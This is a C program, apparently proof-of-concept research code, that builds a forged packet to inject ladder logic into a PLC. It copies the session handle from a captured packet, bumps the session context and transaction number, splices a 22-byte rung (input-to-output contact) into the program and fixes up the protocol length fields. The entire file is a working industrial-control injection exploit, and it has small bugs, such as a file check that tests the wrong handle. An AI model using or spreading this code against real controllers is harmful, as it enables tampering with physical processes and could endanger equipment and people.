#include <stdio.h>
#include <unistd.h>     // getcwd
#include <errno.h>
#include <string.h>
#include <stdint.h>

int insertData(uint8_t* buf, int origin_size, int loc, uint8_t* data, int data_size)
{
    uint16_t* EIP_length = (uint16_t*)(buf+2);
    *EIP_length += data_size;

    uint16_t* cpf_length = (uint16_t*)(buf+39);
    *cpf_length += data_size;

    uint8_t* file_len = buf+46;
    *file_len += data_size;

    // change the length of rung 0 
    // uint16_t* rung_len = (uint16_t*)(buf+55);
    // *rung_len += data_size;

    // change rung checksum?? 
    // buf[53] = 0xc6;       
    // buf[54] = 0x2a;

    uint8_t temp[1024];

    memcpy(temp, buf+loc, origin_size-loc);
    memcpy(buf+loc, data, data_size);    
    memcpy(buf+loc+data_size, temp, origin_size-loc);

    return origin_size+data_size;
}



int main()
{
    char cwd[1024];
/*
    if (getcwd(cwd, sizeof(cwd)) == NULL){
        perror("getcwd() error");
        return -1;
    }
*/
    strcpy(cwd, "/home/hyunguk/etterfilter");


    uint8_t template[1024];
    strcpy(template, cwd);
//    strcat(template, "/template_timer");
    strcat(template, "/template");
    
    FILE* ifp1 = fopen(template, "rb");
    if (ifp1 == NULL){
        printf("fopen fail\n");
        return -1;
    }

    uint8_t just_before_pkt[1024];
    strcpy(just_before_pkt, cwd);
    strcat(just_before_pkt, "/just_before_pkt");
    
    FILE* ifp2 = fopen(just_before_pkt, "rb");
    if (ifp1 == NULL){
        printf("fopen fail\n");
        return -1;
    }

    uint8_t inject_data[1024];
    strcpy(inject_data, cwd);
    strcat(inject_data, "/inject_data");
    
    FILE* ofp = fopen(inject_data, "wb");
    if (ofp == NULL){
        printf("fopen fail\n");
        return -1;
    }

    fread(just_before_pkt, 1, sizeof(just_before_pkt), ifp2);

    int data_len = fread(template, 1, sizeof(template), ifp1);
    memcpy(inject_data, template, data_len);

    // copy session handler
    memcpy(inject_data+4, just_before_pkt+4, 4);

    // handle session context
    uint64_t ses_ctx = *(uint64_t*)(just_before_pkt+12);
    ses_ctx += 2;
    memcpy(inject_data+12, (uint8_t*)&ses_ctx, 8);

    // handle transaction number
    uint8_t transaction_num[2];
    memcpy(transaction_num, just_before_pkt+43, 2);

    // change big endian to little endian
    uint8_t temp = transaction_num[0];
    transaction_num[0] = transaction_num[1];
    transaction_num[1] = temp;

    // add +4 for transaction number
    *(uint16_t*)transaction_num += 4;

    // change littel endian to big endian
    temp = transaction_num[0];
    transaction_num[0] = transaction_num[1];
    transaction_num[1] = temp;

    memcpy(inject_data+43, transaction_num, 2);

    // Modification Part. Ladder logic program starts from offset 51
    //inject_data[57] = 0xe8;

    // XIC/[I1:0/0] --> OTE/[O0:0/0]
    uint8_t data[22] = {0x00, 0x00, 0xb2, 0xca, 0x16, 0x00, 0xe4, 0x00, 0x00, 0x01, 0xbc, 0x4f, 0x00, 0x00, 0xbc, 0x00, 0x00, 0x00, 0xb0, 0x4f, 0x03, 0x00};
    int new_data_len = insertData(inject_data, data_len, 55, data, 22);      // inject between XIC and XIO in first rung
//    int new_data_len = insertData(inject_data, data_len, 82, data, 2);      // inject 0000 between rung #0 and rung #1
//    int new_data_len = insertData(inject_data, data_len, 65, data, 2);      // inject between XIC and XIO in first rung
//    int new_data_len = insertData(inject_data, data_len, 75, data, 4);

    rewind(ofp);
    fwrite(inject_data, 1, new_data_len, ofp);

    fclose(ifp1);
    fclose(ifp2);
    fclose(ofp);

    return 0;
}
